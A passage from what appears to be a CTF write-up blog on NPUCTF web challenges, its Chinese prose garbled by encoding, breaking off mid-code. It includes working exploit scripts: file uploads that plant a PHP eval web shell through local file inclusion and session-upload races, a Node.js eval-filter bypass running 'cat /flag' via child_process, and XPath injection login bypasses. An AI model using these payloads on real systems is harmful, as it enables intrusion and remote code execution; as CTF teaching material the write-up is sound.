class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line">    file_content = <span class="string">&quot;&lt;?php if(file_put_contents(&#x27;/tmp/moonback&#x27;, &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;))&#123;echo &#x27;flag&#x27;;&#125;?&gt;&quot;</span></span><br><span class="line">    self_url = <span class="string">&quot;%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(times)):</span><br><span class="line">        print(<span class="string">&quot;[+] %d / %d&quot;</span> % (i, times))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        upload_file_to_include(self_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_tmp_files()</span><br></pre></td></tr></table></figure><p>æ‰«ç›®å½•å‘ç°æœ‰<code>dir.php</code>ï¼Œåˆšå¥½æŠŠä¸´æ—¶æ–‡ä»¶åå­—åˆ—å‡ºæ¥äº†ï¼Œå…¶å®ä¸åˆ—ä¹Ÿå¯ä»¥ï¼Œåªè¦æŠŠæ‰€æœ‰å¯èƒ½æ€§è·‘å®Œå°±å¯ä»¥äº†</p><p>ç„¶ååŒ…å«ä¼šç”Ÿæˆ<code>/tmp/moonback</code>,å†åŒ…å«æ‹¿shellå°±è¡Œï¼Œæœ€åbypass disable_function,flagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p><p>ç”¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>ä¹Ÿèƒ½ä¸Šä¼ ï¼Œbuuç¯å¢ƒä¸è¡Œï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.97.210.141:9666/flflflflag.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27;</span>     </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(url+<span class="string">&quot;?file=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]retry&#x27;)</span></span><br><span class="line">            print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="éªŒè¯ğŸ"><a href="#éªŒè¯ğŸ" class="headerlink" title="éªŒè¯ğŸ"></a>éªŒè¯ğŸ</h3><p>nodejsé¢˜ç›®ï¼Œæºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ç¬¬ä¸€å±‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p>keysä¸çŸ¥é“ï¼Œè¦æ±‚firstå’Œsecondç›¸ç­‰å¹¶ä¸”é•¿åº¦ä¸ç­‰ï¼Œè¿˜è¦åŠ ç›åçš„MD5å€¼ç›¸ç­‰</p><p>key[0]æ˜¯å­—ç¬¦ä¸²ï¼Œä¸å­—ç¬¦ä¸²ç›¸åŠ ä¼šå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒStringå’ŒArrayç±»å‹éƒ½æœ‰lengthå±æ€§ï¼Œè€Œä¸”</p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426104856.png" style="zoom:80%;"><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸€ä¸ªä¼ æ•°ç»„ï¼Œå¦å¤–ä¸€ä¸ªä¼ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç›´æ¥urlencodedæ˜¯æ— æ³•ä¼ æ•°ç»„çš„ï¼Œåˆå‘ç°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.json());</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ jsonæ•°æ®ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç”¨åŒå¼•å·ï¼ˆå®˜æ–¹æ ‡å‡†ï¼‰ï¼Œå°½ç®¡æœ‰æ—¶å€™å•å¼•å·ä¹Ÿå¯ä»¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="attr">&quot;first&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="attr">&quot;second&quot;</span>:[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426111206.png" style="zoom:67%;"><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸç»•è¿‡ï¼Œæ¥ç€çœ‹ä¸‹ä¸€æ­¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯jsåŸå‹é“¾çš„å†…å®¹äº†ï¼Œçœ‹ä¸æ‡‚äº†ï¼Œè´´ä¸‹exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">encode = <span class="keyword">lambda</span> code: list(map(ord,code))</span><br><span class="line">decode = <span class="keyword">lambda</span> code: <span class="string">&quot;&quot;</span>.join(map(chr,code))</span><br><span class="line">a=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(m0=&gt;(</span></span><br><span class="line"><span class="string">        m0=m0.constructor,</span></span><br><span class="line"><span class="string">        m0.x=m0.constructor(</span></span><br><span class="line"><span class="string">            m0.fromCharCode(<span class="subst">&#123;encode(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span>)&#125;</span>)</span></span><br><span class="line"><span class="string">        )()</span></span><br><span class="line"><span class="string">    ))(Math+1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a=re.sub(<span class="string">r&quot;[\s\[\]]&quot;</span>, <span class="string">&quot;&quot;</span>, a).replace(<span class="string">&quot;m0&quot;</span>,<span class="string">&quot;Math&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426115237.png" style="zoom:67%;"><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><p>æŸ¥çœ‹æºç å‘ç°</p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426121209.png" style="zoom:80%;"><p>æ¯æ¬¡ç”¨ä¸åŒsessionè¯·æ±‚éƒ½ä¼šä¸åŒï¼ŒæŠ“åŒ…å‘ç°æœ‰é˜²æ­¢csrfçš„token,è¯·æ±‚ä¸èƒ½é‡æ”¾</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¯·æ±‚å¸¦ä¸Šsessionè·å–åˆ°token,ç„¶åå†POST</p><p>åé¢å°±æ˜¯xpathæ³¨å…¥çš„å†…å®¹äº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>å‚è€ƒï¼š<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97">https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = simplexml_load_file(<span class="string">&#x27;users.xml&#x27;</span>);</span><br><span class="line">$name = $_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$pwd = md5($_GET[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.$name.<span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.$pwd.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">$result = $xml-&gt;xpath($query);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;ID:&#x27;</span>.$value-&gt;id;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;Username:&#x27;</span>.$value-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯ä¸Šçš„<code>users.xml</code>æ˜¯è¿™æ ·çš„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>jack<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>tony<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flag</span>&gt;</span>flag&#123;My_f1rst_xp4th_iNjecti0n&#125;<span class="tag">&lt;/<span class="name">flag</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xpathå­¦ä¹ å‚è€ƒï¼š<a href="https://www.runoob.com/xpath/xpath-tutorial.html">https://www.runoob.com/xpath/xpath-tutorial.html</a></p><h4 id="xpathæ³¨å…¥å¸¸è§å‡½æ•°"><a href="#xpathæ³¨å…¥å¸¸è§å‡½æ•°" class="headerlink" title="xpathæ³¨å…¥å¸¸è§å‡½æ•°"></a>xpathæ³¨å…¥å¸¸è§å‡½æ•°</h4><ul><li>codepoints-to-string(a, b, c, â€¦)ï¼šå°†æ•°å­— aã€bã€c è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦ï¼Œ Python çš„<code>chr</code>å‡½æ•°ç±»ä¼¼ã€‚</li><li>string-to-codepoints(string)ï¼šä¸ä¸Šé¢çš„ç›¸å</li><li>compare(a, b, rule)ï¼šæ¯”å¤§å°ï¼Œfunc æ˜¯æ¯”è¾ƒå¤§å°çš„è§„åˆ™</li><li>string-join((string, string, â€¦), sep)ï¼šä½¿ç”¨ sep å‚æ•°ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ¥è¿”å› string å‚æ•°æ‹¼æ¥åçš„å­—ç¬¦ä¸²ã€‚</li><li>substring(string, start [,len])ï¼šè¿”å›ä» start ä½ç½®å¼€å§‹çš„æŒ‡å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä¸‹æ ‡æ˜¯ 1ã€‚å¦‚æœçœç•¥ len å‚æ•°ï¼Œåˆ™è¿”å›ä»ä½ç½® start åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„å­å­—ç¬¦ä¸²ã€‚</li><li>string-length([string])ï¼šè¿”å›æŒ‡å®šå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚å¦‚æœæ²¡æœ‰ string å‚æ•°ï¼Œåˆ™è¿”å›å½“å‰èŠ‚ç‚¹çš„å­—ç¬¦ä¸²å€¼çš„é•¿åº¦ã€‚</li><li>count(item[, item1, â€¦])ï¼šè¿”å›èŠ‚ç‚¹çš„æ•°é‡ã€‚</li><li>position()ï¼šè¿”å›å½“å‰æ­£åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹çš„ index ä½ç½®ã€‚</li><li>last()ï¼šè¿”å›åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹åˆ—è¡¨ä¸­çš„é¡¹ç›®æ•°ç›®ã€‚</li><li>name([nodeset])ï¼šè¿”å›å½“å‰èŠ‚ç‚¹çš„åç§°æˆ–æŒ‡å®šèŠ‚ç‚¹é›†ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</li></ul><p>å¸¸è§çš„æ³¨å…¥åˆ†ä¸ºä¸¤ç§ï¼Œå¸¸è§„æ³¨å…¥å’Œå¸ƒå°”ç›²æ³¨ï¼Œä»¥ä¸Šé¢çš„ä¸ºä¾‹ï¼Œå…ˆè¯´ä¸‹å¸¸è§„æ³¨å…¥</p><h4 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h4><p>ä¸Šé¢é‚£ä¸ªæˆ‘ä»¬å°±å¯ä»¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.$name.<span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.$pwd.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"><span class="comment">//éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·åï¼Œæ„é€ </span></span><br><span class="line">?u=admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;admin&#x27; or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬ä¸çŸ¥é“ç”¨æˆ·åï¼Œå¯ä»¥è¿™æ ·æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 